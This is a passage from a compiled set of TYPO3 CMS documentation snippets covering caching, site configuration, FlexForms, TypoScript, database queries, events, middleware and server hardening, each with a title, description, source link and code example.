'things' => $this->thingRepository->findAll(),\n        ]);\n        return $this->moduleTemplate->renderResponse('ExtbaseModule/List');\n    }\n\n+     protected function initializeDeleteAction(): void\n+     {\n+         $this->assertAllowedHttpMethod($this->request, 'POST');\n+     }\n+\n    public function deleteAction(Thing $thing): ResponseInterface\n    {\n        $this->thingRepository->remove($thing);\n        return $this->redirect('list');\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Referencing TYPO3 Cache Backend Interface in PHP\nDESCRIPTION: Defines the main interface that all valid storage backends must implement in TYPO3's caching system. It is used to specify backend capabilities, with some frontends requiring additional interfaces.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CachingFramework/Architecture/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: PHP\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Cache\\Backend\\BackendInterface\n```\n\n----------------------------------------\n\nTITLE: TYPO3 Site Language Base Variants Configuration\nDESCRIPTION: YAML configuration example showing how to set up different base URLs for the same language based on application context conditions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/AddLanguages.rst#2025-04-16_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nbaseVariants:\n  -\n    base: 'https://example.localhost/'\n    condition: 'applicationContext == \"Development\"'\n  -\n    base: 'https://staging.example.com/'\n    condition: 'applicationContext == \"Production/Sydney\"'\n  -\n    base: 'https://testing.example.com/'\n    condition: 'applicationContext == \"Testing/Paris\"'\n```\n\n----------------------------------------\n\nTITLE: Creating a Select Field in FlexForm Configuration\nDESCRIPTION: Example of defining a select field in a FlexForm configuration with predefined options for ordering records, using language labels for better localization.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FlexForms/Index.rst#2025-04-16_snippet_5\n\nLANGUAGE: XML\nCODE:\n```\n<settings.orderBy>\n    <label>\n        LLL:EXT:example/Resources/Private/Language/Backend.xlf:settings.registration.orderBy\n    </label>\n    <config>\n        <type>select</type>\n        <renderType>selectSingle</renderType>\n        <items>\n            <numIndex index=\"0\">\n                <label>\n                    LLL:EXT:example/Resources/Private/Language/Backend.xlf:settings.registration.orderBy.crdate\n                </label>\n                <value>crdate</value>\n            </numIndex>\n            <numIndex index=\"1\">\n                <label>\n                    LLL:EXT:example/Resources/Private/Language/Backend.xlf:settings.registration.orderBy.title\n                </label>\n                <value>title</value>\n            </numIndex>\n        </items>\n    </config>\n</settings.orderBy>\n```\n\n----------------------------------------\n\nTITLE: Configuring Page XML Sitemap in TypoScript\nDESCRIPTION: TypoScript configuration for excluding specific page types and setting additional conditions for the pages sitemap.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Seo/XmlSitemap.rst#2025-04-16_snippet_1\n\nLANGUAGE: typoscript\nCODE:\n```\nplugin.tx_seo {\n    config {\n        xmlSitemap {\n            sitemaps {\n                pages {\n                    config {\n                        excludedDoktypes = 3, 4, 6, 7, 199, 254, 255, 137, 138\n                        additionalWhere = AND ({#no_index} = 0 OR {#no_follow} = 0)\n                        #rootPage = <optionally specify a different root page. (default: rootPageId from site configuration)>\n                        excludePagesRecursive = <comma-separated list of page IDs>\n                    }\n                }\n            }\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Getting File Properties in AfterFileCreatedEvent in TYPO3 CMS\nDESCRIPTION: The AfterFileCreatedEvent class provides methods to access properties of newly created files. The getFileName() method returns the name of the created file as a string, while getFolder() returns the target folder object where the file was created.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/AfterFileCreatedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n..  php:method:: getFileName()\n    :returns: `string`\n\n..  php:method:: getFolder()\n    :returns: `\\TYPO3\\CMS\\Core\\Resource\\Folder`\n```\n\n----------------------------------------\n\nTITLE: Disabling TYPO3 Core Updater in NGINX Configuration\nDESCRIPTION: NGINX server configuration that sets the environment variable to disable the TYPO3 Core Updater functionality. This should be added to the NGINX configuration file within the appropriate server/location block.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/Legacy/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: nginx\nCODE:\n```\nserver {\n  location ~ path/to/it {\n    include fastcgi_params;\n    fastcgi_param TYPO3_DISABLE_CORE_UPDATER \"1\";\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Event Class Reference - TYPO3 AfterStdWrapFunctionsExecutedEvent\nDESCRIPTION: PHP class reference showing the namespace and usage pattern for the AfterStdWrapFunctionsExecutedEvent in TYPO3 CMS. This event fires after stdWrap functions have been executed on content.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Frontend/AfterStdWrapFunctionsExecutedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Frontend\\ContentObject\\Event\\AfterStdWrapFunctionsExecutedEvent\n```\n\n----------------------------------------\n\nTITLE: Evaluating Site Identifier in TypoScript\nDESCRIPTION: Demonstrates how to check the site identifier in a TypoScript condition using the site() function.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/UseSiteInConditions.rst#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\n[site(\"identifier\") == \"someIdentifier\"]\n   page.30.value = foo\n[GLOBAL]\n```\n\n----------------------------------------\n\nTITLE: Overriding Localized Terms in TypoScript\nDESCRIPTION: Shows how to override localized text strings for multiple languages using _LOCAL_LANG in TypoScript configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/Localization/TypoScript.rst#2025-04-16_snippet_1\n\nLANGUAGE: typoscript\nCODE:\n```\nplugin.tx_blogexample._LOCAL_LANG {\n    default.comment_header = Remarks\n    de.comment_header = Anmerkungen\n    zh.comment_header = 注释\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring LinkHandler in TypoScript for Record Links\nDESCRIPTION: This TypoScript configuration sets up the LinkHandler for record links with a specific identifier. It defines the link generation parameters and additional query parameters.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/Linkhandler/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: typoscript\nCODE:\n```\nconfig.recordLinks.anIdentifier {\n    forceLink = 0\n\n    typolink {\n        parameter = 123\n        additionalParams.data = field:uid\n        additionalParams.wrap = &tx_example_pi1[item]=|\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Custom StaticDatabaseMapper for Blog in TYPO3 CMS\nDESCRIPTION: This PHP class implements a custom StaticDatabaseMapper for the Blog extension, handling slug generation and caching.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Routing/Examples.rst#2025-04-16_snippet_7\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace T3G\\AgencyPack\\Blog\\Routing\\Aspect;\n\nuse TYPO3\\CMS\\Core\\Database\\ConnectionPool;\n use TYPO3\\CMS\\Core\\Database\\Query\\Restriction\\DeletedRestriction;\n use TYPO3\\CMS\\Core\\Utility\\GeneralUtility;\n use TYPO3\\CMS\\Core\\Routing\\Aspect\\StaticMappableAspectInterface;\n use TYPO3\\CMS\\Core\\Routing\\Aspect\\PersistedPatternMapper;\n use TYPO3\\CMS\\Core\\Routing\\StaticDatabaseMapper;\n\nclass BlogStaticDatabaseMapper extends StaticDatabaseMapper implements StaticMappableAspectInterface\n{\n     public function resolve(string $value): ?string\n     {\n         $result = parent::resolve($value);\n         if ($result === null) {\n             $uid = $this->getUidBySlug($value);\n             if ($uid) {\n                 $result = $uid;\n                 $this->populateCache($result, $value);\n             }\n         }\n         return $result;\n     }\n\n     protected function getUidBySlug(string $slug): ?string\n     {\n         if (!is_string($slug)) {\n             return null;\n         }\n\n         $queryBuilder = GeneralUtility::makeInstance(ConnectionPool::class)\n             ->getQueryBuilderForTable($this->tableName);\n\n         $queryBuilder\n             ->getRestrictions()\n             ->removeAll()\n             ->add(GeneralUtility::makeInstance(DeletedRestriction::class));\n\n         $query = $queryBuilder\n             ->select('uid')\n             ->from($this->tableName)\n             ->where(\n                 $queryBuilder->expr()->in(\n                     $this->routeFieldName,\n                     $queryBuilder->createNamedParameter($slug)\n                 )\n             )\n             ->setMaxResults(1);\n\n         $result = $query->executeQuery()->fetchNumeric();\n         return $result ? (string)$result[0] : null;\n     }\n}\n```\n\n----------------------------------------\n\nTITLE: Global Request Variable Getter Method\nDESCRIPTION: Example of creating a getter method to wrap the global TYPO3_REQUEST variable access.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/Typo3Request.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\nprivate function getRequest(): ServerRequestInterface\n{\n    return $GLOBALS['TYPO3_REQUEST'];\n}\n```\n\n----------------------------------------\n\nTITLE: Converting TYPO3 Enumeration class to PHP backed enum\nDESCRIPTION: Example showing how to convert a class extending TYPO3's deprecated Enumeration class to a PHP backed enum. The original class defined state constants and methods to work with these states.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/BitSets/Enumeration.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Enumeration;\n\nuse TYPO3\\CMS\\Core\\Type\\Enumeration;\n\nclass State extends Enumeration\n{\n    public const STATE_NEW = 1;\n    public const STATE_PENDING = 2;\n    public const STATE_DECLINED = 3;\n    public const STATE_ACCEPTED = 4;\n\n    /**\n     * Get the state label\n     */\n    public function getStateLabel(): string\n    {\n        return match ($this->value) {\n            self::STATE_NEW => 'new',\n            self::STATE_PENDING => 'pending',\n            self::STATE_DECLINED => 'declined',\n            self::STATE_ACCEPTED => 'accepted',\n            default => '',\n        };\n    }\n}\n\n```\n\n----------------------------------------\n\nTITLE: Implementing Season Translation Middleware in TYPO3 CMS\nDESCRIPTION: A TYPO3 middleware class that handles translation of season names. It implements MiddlewareInterface and uses language service factory to translate season names based on site language settings. The class maintains a constant list of seasons and their corresponding translation paths.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/Localization/_php/_LanguageServiceSl.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nuse Psr\\Http\\Message\\ServerRequestInterface;\n\nfinal readonly class HaikuSeasonList implements MiddlewareInterface\n{\n    private const SEASONS = ['spring', 'summer', 'autumn', 'winter', 'theFifthSeason'];\n    private const TRANSLATION_PATH = 'LLL:EXT:examples/Resources/Private/Language/PluginHaiku/locallang.xlf:season.';\n\n    /**\n     * @return array<string, string>\n     */\n    private function getSeasons(ServerRequestInterface $request): array\n    {\n        $languageService = $this->languageServiceFactory->createFromSiteLanguage(\n            $request->getAttribute('language') ?? $request->getAttribute('site')->getDefaultLanguage(),\n        );\n\n        $translatedSeasons = [];\n        foreach (self::SEASONS as $season) {\n            $translatedSeasons[$season] = $languageService->sL(self::TRANSLATION_PATH . $season);\n        }\n\n        return $translatedSeasons;\n    }\n```\n\n----------------------------------------\n\nTITLE: Multi-site Project Backend Groups Base Structure\nDESCRIPTION: PlantUML diagram showing the initial structure of backend user groups for a multi-site TYPO3 project.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/PermissionsManagement/ExampleConfiguration/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: plantuml\nCODE:\n```\n..  uml:: _backend-groups-multisite-project-1.plantuml\n```\n\n----------------------------------------\n\nTITLE: Defining AfterFileRenamedEvent Class in TYPO3 CMS Core API\nDESCRIPTION: This snippet defines the AfterFileRenamedEvent class in the TYPO3\\CMS\\Core\\Resource\\Event namespace. The class is used to handle events after a file has been renamed, allowing for further processing of the file or filename, or updating custom references to the file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/AfterFileRenamedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Core\\Resource\\Event;\n\nclass AfterFileRenamedEvent\n{\n    public function getFile(): \\TYPO3\\CMS\\Core\\Resource\\FileInterface\n    {\n        // Implementation not shown\n    }\n\n    public function getTargetFileName(): ?string\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing CommentRepository with Custom Query Settings in TYPO3\nDESCRIPTION: Defines a CommentRepository class that implements a method to fetch all comments while ignoring enable fields. The repository extends the base Repository class and uses TYPO3's Extbase QueryResultInterface for type safety.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/Domain/SpecialQuerySettings.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nuse TYPO3\\CMS\\Extbase\\Persistence\\QueryResultInterface;\n\nclass CommentRepository extends Repository\n{\n    public function findAllIgnoreEnableFields(): QueryResultInterface\n    {\n        $query = $this->createQuery();\n        $query->getQuerySettings()->setIgnoreEnableFields(true);\n        return $query->execute();\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Warning Modal with Buttons in TYPO3\nDESCRIPTION: Demonstrates creating a warning-level modal with customized buttons including a cancel and a dangerous action button.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/Modules/Modals.rst#2025-04-16_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nTYPO3.Modal.confirm('Warning', 'You may break the internet!', TYPO3.Severity.warning, [\n    {\n        text: 'Break it',\n        btnClass: 'btn-danger',\n        trigger: function() {\n            // Do stuff\n        }\n    }, {\n        text: 'Continue',\n        active: true,\n        btnClass: 'btn-default',\n        trigger: function() {\n            // Do stuff\n        }\n    }\n]);\n```\n\n----------------------------------------\n\nTITLE: Complex SELECT Query Using QueryBuilder in TYPO3\nDESCRIPTION: Advanced query example showing how to use QueryBuilder with custom WHERE conditions and restriction manipulation. Demonstrates OR conditions and custom field selection.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/BasicCrud/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: sql\nCODE:\n```\nSELECT `uid`, `pid`, `bodytext` FROM `tt_content` WHERE ((`bodytext` = 'lorem') OR (`uid` = 4)) AND (`tt_content`.`deleted` = 0)\n```\n\n----------------------------------------\n\nTITLE: Setting SMTP Restart Threshold\nDESCRIPTION: This snippet defines the maximum number of messages that can be sent before restarting the SMTP transport. This ensures stability and can help prevent errors in message sending.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/MAIL.rst#2025-04-16_snippet_13\n\nLANGUAGE: text\nCODE:\n```\n:Path: $GLOBALS['TYPO3_CONF_VARS']['MAIL']['transport_smtp_restart_threshold']\n:type: text\n:Default: ''\n\n*only with transport=smtp* Sets the maximum number of messages to send before re-starting the transport.\n```\n\n----------------------------------------\n\nTITLE: Importing YAML Files in YAML Configuration\nDESCRIPTION: Shows how to import other YAML files within a YAML configuration file, including support for glob patterns.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/YamlApi/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nimports:\n    - { resource: \"EXT:rte_ckeditor/Configuration/RTE/Processing.yaml\" }\n    - { resource: \"misc/my_options.yaml\" }\n    - { resource: \"../path/to/something/within/the/project-folder/generic.yaml\" }\n    - { resource: \"./**/*.yaml\", glob: true }\n    - { resource: \"EXT:core/Tests/**/Configuration/**/SiteConfigs/*.yaml\", glob: true }\n```\n\n----------------------------------------\n\nTITLE: Single Site Organized Backend Groups Structure\nDESCRIPTION: PlantUML diagram illustrating the organized structure of backend user groups showing how system and ACL groups are combined into role groups.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/PermissionsManagement/ExampleConfiguration/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: plantuml\nCODE:\n```\n..  uml:: _backend-groups-simple-project-organized.plantuml\n```\n\n----------------------------------------\n\nTITLE: Retrieving Module Identifier in TYPO3 Backend\nDESCRIPTION: This method returns the identifier of the module as a string. It is used to uniquely identify the module within the TYPO3 backend system.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Entity/ModuleData.rst.txt#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n..  php:method:: getModuleIdentifier()\n        :returns: `string`\n```\n\n----------------------------------------\n\nTITLE: Retrieving TypoScript Setup Array in TYPO3 Frontend\nDESCRIPTION: Example of how to retrieve the full TypoScript setup array from a request attribute. This replaces the traditional approach of accessing TypoScript through $GLOBALS['TSFE']->tmpl->setup.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/RequestAttributes/FrontendTyposcript.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n// Substitution of $GLOBALS['TSFE']->tmpl->setup\n$fullTypoScript = $request->getAttribute('frontend.typoscript')\n    ->getSetupArray();\n```\n\n----------------------------------------\n\nTITLE: YAML Service Configuration\nDESCRIPTION: Service configuration for dependency injection of the GitHub link handler.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/Tutorials/CustomLinkBrowser.rst#2025-04-16_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nservices:\n  T3docs\\Examples\\LinkHandler\\GitHubLinkHandler:\n    public: true\n    shared: false\n```\n\n----------------------------------------\n\nTITLE: Selecting Records with Connection in TYPO3\nDESCRIPTION: Example of using the select() method to retrieve records from a database table with specific criteria. This method returns a Result object ready for fetching rows.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/Connection/Index.rst#2025-04-16_snippet_10\n\nLANGUAGE: php\nCODE:\n```\npublic function findByTitle(string $title): array\n{\n    $connectionPool = GeneralUtility::makeInstance(ConnectionPool::class);\n    $connection = $connectionPool->getConnectionForTable('tx_myextension_domain_model_mytable');\n    $result = $connection->select(\n        ['uid', 'title', 'bodytext'],\n        'tx_myextension_domain_model_mytable',\n        [\n            'title' => $title,\n        ]\n    );\n    $rows = [];\n    while ($row = $result->fetchAssociative()) {\n        $rows[] = $row;\n    }\n    return $rows;\n}\n```\n\n----------------------------------------\n\nTITLE: Validating Username with RegularExpression Validator in PHP\nDESCRIPTION: Example of using the RegularExpression validator to ensure a username contains only alphanumeric characters.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Validation/Validators/Index.rst#2025-04-16_snippet_9\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Extbase\\Annotation\\Validate;\n\nclass UserForm\n{\n    #[Validate([\n        'validator' => 'RegularExpression',\n        'options' => [\n            'regularExpression' => '/^[a-z0-9]+$/i'\n        ]\n    ])]\n    public string $username = '';\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Target Attribute from TYPO3 Backend Request in PHP\nDESCRIPTION: This code snippet demonstrates how to access the 'target' attribute from a TYPO3 backend request object. The 'target' attribute contains the target action of a backend route, such as the controller and action method for a specific module.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/RequestAttributes/Target.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n$target = $request->getAttribute('target');\n```\n\n----------------------------------------\n\nTITLE: Creating New Page Records with DataHandler in PHP\nDESCRIPTION: Examples of creating new page records with different relationships and positions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DataHandler/Database/Index.rst#2025-04-16_snippet_5\n\nLANGUAGE: php\nCODE:\n```\n$data['pages']['NEW9823be87'] = [\n    'title' => 'The page title',\n    'subtitle' => 'Other title stuff',\n    'pid' => '45'\n];\n```\n\n----------------------------------------\n\nTITLE: Populating a Select Field with a PHP Function in FlexForm\nDESCRIPTION: Example of using itemsProcFunc in a FlexForm configuration to dynamically populate a select field using a custom PHP function, providing more flexibility for select options.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FlexForms/Index.rst#2025-04-16_snippet_6\n\nLANGUAGE: XML\nCODE:\n```\n<settings.orderBy>\n    <label>\n        LLL:EXT:example/Resources/Private/Language/Backend.xlf:settings.registration.orderBy\n    </label>\n    <config>\n        <type>select</type>\n        <itemsProcFunc>MyVendor\\Example\\Backend\\ItemsProcFunc->user_orderBy\n        </itemsProcFunc>\n        <renderType>selectSingle</renderType>\n        <items>\n            <!-- empty by default -->\n        </items>\n    </config>\n</settings.orderBy>\n```\n\n----------------------------------------\n\nTITLE: RedirectWasHitEvent Class Method Definitions - PHP\nDESCRIPTION: Defines the methods available in the RedirectWasHitEvent class for handling redirect events in TYPO3. Methods include getting request details, managing target URLs, handling matched redirects, and manipulating responses.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Redirects/RedirectWasHitEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n..  php:method:: getRequest()\n    :returns: `\\Psr\\Http\\Message\\ServerRequestInterface`\n\n..  php:method:: getTargetUrl()\n    :returns: `\\Psr\\Http\\Message\\UriInterface`\n\n..  php:method:: setMatchedRedirect(array $matchedRedirect)\n    :param $matchedRedirect: the matchedRedirect\n\n..  php:method:: getMatchedRedirect()\n    :returns: `array`\n\n..  php:method:: setResponse(\\Psr\\Http\\Message\\ResponseInterface $response)\n    :param $response: the response\n\n..  php:method:: getResponse()\n    :returns: `\\Psr\\Http\\Message\\ResponseInterface`\n```\n\n----------------------------------------\n\nTITLE: Enforcing Content Security Policy in TYPO3 Site Configuration\nDESCRIPTION: YAML configuration to enable CSP enforcement for a specific TYPO3 site. This snippet sets the 'enforce' disposition to true in the site's csp.yaml file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentSecurityPolicy/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\ndisposition:\n  enforce: true\n```\n\n----------------------------------------\n\nTITLE: Registering Global ViewHelper Namespaces in TYPO3\nDESCRIPTION: Shows how to register global ViewHelper namespaces in the TYPO3 configuration array, making them available across all templates.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/Syntax.rst#2025-04-16_snippet_17\n\nLANGUAGE: php\nCODE:\n```\n..  literalinclude:: _Syntax/_ext_localconf.php\n    :language: php\n    :caption: EXT:mye_extension/ext_localconf.php\n```\n\n----------------------------------------\n\nTITLE: Setting OpenGraph Meta Tags in TYPO3 TypoScript\nDESCRIPTION: This TypoScript code sets OpenGraph meta tags for title, description, and image. It uses page properties and fallbacks to system fields.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Seo/Configuration/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: typoscript\nCODE:\n```\npage {\n  meta {\n    og:title {\n      attribute = property\n      field = og_title // seo_title // title\n    }\n    og:description {\n      attribute = property\n      field = og_description // description // abstract\n    }\n    og:image {\n      attribute = property\n      stdWrap.cObject = FILES\n      stdWrap.cObject {\n        references {\n          table = pages\n          fieldName = og_image\n          data = levelfield:-1, og_image, slide\n        }\n        maxItems = 1\n        renderObj = IMG_RESOURCE\n        renderObj {\n          file.import.data = file:current:uid\n          file.treatIdAsReference = 1\n          file.width = 1200c\n          file.height = 630c\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using AfterFolderAddedEvent in TYPO3 CMS Core API\nDESCRIPTION: This code represents the AfterFolderAddedEvent class in TYPO3's Core Resource system. It fires after a folder has been added to a storage/driver and provides access to the folder object and storage.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Resource/AfterFolderAddedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Resource\\Event\\AfterFolderAddedEvent\n```\n\n----------------------------------------\n\nTITLE: Defining PSR HTTP MiddlewareInterface in PHP\nDESCRIPTION: Defines the PSR HTTP MiddlewareInterface which specifies the contract for middleware components that process HTTP messages. The interface includes a process method that handles incoming server requests and produces responses, with the ability to delegate to subsequent handlers.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Middleware/MiddlewareInterface.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nphp:interface:: MiddlewareInterface\n\n    Participant in processing a server request and response.\n\n    An HTTP middleware component participates in processing an HTTP message:\n    by acting on the request, generating the response, or forwarding the\n    request to a subsequent middleware and possibly acting on its response.\n\n    php:method:: process(\\Psr\\Http\\Message\\ServerRequestInterface $request, \\Psr\\Http\\Server\\RequestHandlerInterface $handler)\n        :returns: `\\Psr\\Http\\Message\\ResponseInterface`\n\n        Process an incoming server request.\n\n        Processes an incoming server request in order to produce a response.\n        If unable to produce the response itself, it may delegate to the provided\n        request handler to do so.\n\n        :param $request: the request\n        :param $handler: the handler\n```\n\n----------------------------------------\n\nTITLE: Setting Directory Index Options in Apache Configuration\nDESCRIPTION: This example shows how to configure directory options directly in the Apache configuration file to prevent directory indexing for a specific directory. It includes overriding all options to ensure indexing is not enabled.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Security/GuidelinesAdministrators/DirectoryIndexing.rst#2025-04-16_snippet_1\n\nLANGUAGE: apacheconf\nCODE:\n```\n<IfModule mod_autoindex.c>\n   <Directory /var/www/myhost/public>\n      # override all Options, do not activate Indexes for security reasons\n      Options FollowSymLinks\n   </Directory>\n</IfModule>\n```\n\n----------------------------------------\n\nTITLE: Using Extbase DebuggerUtility to Inspect Variables in TYPO3\nDESCRIPTION: Example of using Extbase's DebuggerUtility to dump variable contents for debugging purposes. This utility provides detailed information about variables including their type and structure.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Debugging/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\n\\TYPO3\\CMS\\Extbase\\Utility\\DebuggerUtility::var_dump($myVariable);\n```\n\n----------------------------------------\n\nTITLE: User Settings Global Configuration in TYPO3\nDESCRIPTION: Defines the user settings available for backend users, stored in the global configuration array $GLOBALS['TYPO3_USER_SETTINGS']. This configuration allows for extensibility so that additional settings can be integrated through extensions. The values are accessed via $GLOBALS['BE_USER']->uc, which provides user-specific configurations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/UserSettingsConfiguration/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n$GLOBALS['TYPO3_USER_SETTINGS']\n```\n\nLANGUAGE: PHP\nCODE:\n```\n$GLOBALS['BE_USER']->uc\n```\n\n----------------------------------------\n\nTITLE: Overriding FlexForm Container in FormEngine for TYPO3 CMS in PHP\nDESCRIPTION: Demonstrates how to override the default FlexForm container in TYPO3's FormEngine with a custom implementation. This allows extending FormEngine functionality for specific needs like multi-language rendering of flex fields.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FormEngine/Rendering/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n<?php\n// Register our implementation of flex to replace TYPO3 implementation with\n// an extended version. First parameter is the name of renderType to override.\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['formEngine']['nodeRegistry'][1443361297] = [\n    'nodeName' => 'flex',\n    'priority' => 40,\n    'class' => \\MyVendor\\TemplaVoila\\Form\\Container\\FlexFormEntryContainer::class,\n];\n```\n\n----------------------------------------\n\nTITLE: Creating a Database Table for DatabaseWriter in TYPO3\nDESCRIPTION: SQL code to create a database table named 'tx_examples_log' for storing log entries with the DatabaseWriter. The table includes columns for timestamp, request ID, component, level, message, and data.\nSOURCE: 